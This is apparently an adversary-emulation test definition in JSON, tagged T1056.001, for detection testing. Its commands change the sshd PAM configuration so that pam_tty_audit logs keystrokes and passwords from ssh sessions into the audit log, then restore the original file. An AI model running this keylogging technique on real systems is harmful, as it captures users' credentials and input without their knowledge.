{
  "id": "81d7d2ad-d644-4b6a-bea7-28ffe43becca",
  "name": "SSHD PAM keylogger",
  "description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "8435a206-ce39-4b19-b38f-b4d8d2eda57c",
      "type": "execute-command",
      "data": {
        "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" \u003e\u003e /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "526f2ebf-ed5a-43b9-bfcb-49e4a2560a1d",
      "type": "execute-command",
      "data": {
        "command": "cp -fv /tmp/sshd /etc/pam.d/",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "9d24821a-3510-4104-a408-82b4d5d5fd71",
      "name": "Check dependency 1/1",
      "description": "This test requires sshd and auditd\n",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "925c18b5-77d7-4552-8c6c-5fbab322d345",
      "name": "Resolve dependency 1/1",
      "description": "This test requires sshd and auditd\n",
      "type": "execute-command",
      "data": {
        "command": "echo \"\"",
        "command_type": "sh"
      },
      "elevation_required": true
    },
    {
      "id": "3aa9c401-8975-4685-bdd1-22be487aab8a",
      "name": "Re-check dependency 1/1",
      "description": "This test requires sshd and auditd\n",
      "type": "execute-command",
      "data": {
        "command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi",
        "command_type": "sh"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "8435a206-ce39-4b19-b38f-b4d8d2eda57c",
      "p": "on-success",
      "o": "526f2ebf-ed5a-43b9-bfcb-49e4a2560a1d"
    },
    {
      "s": "8435a206-ce39-4b19-b38f-b4d8d2eda57c",
      "p": "on-failure",
      "o": "526f2ebf-ed5a-43b9-bfcb-49e4a2560a1d"
    },
    {
      "s": "9d24821a-3510-4104-a408-82b4d5d5fd71",
      "p": "on-success",
      "o": "8435a206-ce39-4b19-b38f-b4d8d2eda57c"
    },
    {
      "s": "9d24821a-3510-4104-a408-82b4d5d5fd71",
      "p": "on-failure",
      "o": "925c18b5-77d7-4552-8c6c-5fbab322d345"
    },
    {
      "s": "925c18b5-77d7-4552-8c6c-5fbab322d345",
      "p": "on-success",
      "o": "3aa9c401-8975-4685-bdd1-22be487aab8a"
    },
    {
      "s": "3aa9c401-8975-4685-bdd1-22be487aab8a",
      "p": "on-failure",
      "o": "8435a206-ce39-4b19-b38f-b4d8d2eda57c"
    }
  ],
  "tags": [
    "T1056",
    "T1056.001"
  ],
  "input_arguments": [
    {
      "name": "user_account",
      "type": "string",
      "description": "Basic ssh user account for testing.",
      "value": "ubuntu"
    }
  ]
}